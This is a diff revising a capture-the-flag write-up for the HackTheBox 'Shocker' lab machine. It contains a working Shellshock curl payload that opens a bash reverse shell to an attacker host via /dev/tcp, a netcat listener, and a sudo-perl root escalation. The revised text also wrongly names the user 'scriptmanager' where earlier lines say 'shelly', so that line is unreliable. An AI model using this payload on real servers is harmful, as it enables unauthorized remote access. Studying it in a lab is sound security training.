@@ -1,4 +1,4 @@
-# hackthebox shocker writeup
+# shocker
 
 [link to the box](https://app.hackthebox.com/machines/Shocker)
 
@@ -22,7 +22,7 @@ looks like we have we website hosted on port 80, lets go there.
 
 http://10.10.10.56:80/
 
-which is a blank webpage with an image embedded in it. inspecting the header in burpsuite shows little information either.
+which is a blank webpage with an image embedded in it. sending an OPTIONS http request reveals nothing interesting.
 
 but there are files stored on this webserver, like the image. lets run `gobuster` and see if we can spot anything else.
 
@@ -57,7 +57,7 @@ $ dirb http://10.10.10.56:80/cgi-bin/ -x script-extensions.txt
 
 by visiting this webpage we can run said `user.sh` script, but we cannot modify it directly.
 
-![user.sh](img/usrsh.png)
+![user.sh](img/usersh.png)
 
 # exploiting
 
@@ -67,21 +67,13 @@ since we know that `.sh` files are basically always bash scripts, we can look up
 
 [this webpage](https://www.ampliasecurity.com/blog/2014/09/24/exploiting_bash_remote_code_execution_vulnerability_CVE-2014-6271/) explains nicely how to use this exploit. any script called using `/bin/bash -c <command>` is vulnerable!
 
-running
+run the following to start a reverse shell. dont forget to start a netcat listener
 
 ```bash
-$ curl -H "User-Agent: () { :;}; echo; echo \"/bin/bash -i >& /dev/tcp/<your local ip>/<any sane port> 0>&1\" | /bin/bash" http://10.10.10.56:80/cgi-bin/user.sh
-```
-
-will connect to your netcat listener you started using 
-
-```bash
-$ nc -lvp <your local ip>
+$ curl -H "User-Agent: () { :;}; echo; echo \"/bin/bash -i >& /dev/tcp/<local ip>/<unused port> 0>&1\" | /bin/bash" http://10.10.10.56:80/cgi-bin/user.sh
 ```
 
 we now have a reverse shell on the server!
-
-# pwning
 
 running `whoami` tells us that we are user `shelly`. we can probably find the user flag in `/home/shelly/`.
 
@@ -92,11 +84,13 @@ $ cat /home/shelly/user.txt
 
 now we need to find root. the simplest way is to see what permissions `shelly` user has.
 
-`/etc/sudoers` and `/etc/doas.conf` are unreadable and do not exist respectively. but we can still see what we can do using `sudo -l`.
+# pwning
 
-and with no passwrod required, we have full access to `sudo /usr/bin/perl`. its pretty obvious how we can execute anything from perl.
+`/etc/sudoers` and `/etc/doas.conf` are unreadable and do not exist respectively. but we can still see what we can do as `scriptmanager` using `sudo -l`.
 
-to get a bash shell, run 
+and with no password required, we have full access to `sudo /usr/bin/perl`. its pretty obvious how we can execute anything from perl.
+
+using perl, upgrade the shell to root.
 
 ```
 $ sudo perl -e 'exec "/bin/bash"'
